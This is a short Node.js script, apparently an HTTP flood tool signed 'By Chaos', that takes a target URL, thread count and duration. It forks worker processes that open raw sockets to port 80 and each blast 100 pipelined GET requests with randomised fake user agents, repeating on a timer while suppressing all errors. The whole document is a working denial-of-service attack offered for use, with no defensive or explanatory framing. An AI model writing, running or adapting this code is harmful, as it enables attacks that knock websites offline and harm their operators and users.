const cluster = require("cluster")
const url = require("url");
const EventEmitter = require('events');
fakeUa = require('fake-useragent')
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY); 
if(process.argv.length !== 5){
console.log("By Chaos  ! ")
console.log("node socket.js url th time");
process.exit(0)
}
var target = process.argv[2];
var time = process.argv[4];
var th = process.argv[3];
var host = url.parse(target).host;
var intv = setInterval(()=>{
const client = require("net").Socket()
var ua = fakeUa()
function main(){
var pakete = 'GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
client.connect(80,host)
client.setTimeout(10000);
for(let i=0;i<100;i++){
client.write(pakete)
}
client.on('data',()=>{
setTimeout(()=>{
client.destroy();
return delete client;
})
})
}
if(cluster.isMaster){
for(let i=0;i<th;i++){
cluster.fork()
}
}
else{
main()}
setTimeout(()=>clearInterval(intv),time*1000)
})

process.on('uncaughtException', function (err) {
});

process.on('unhandledRejection', function (err) {
});
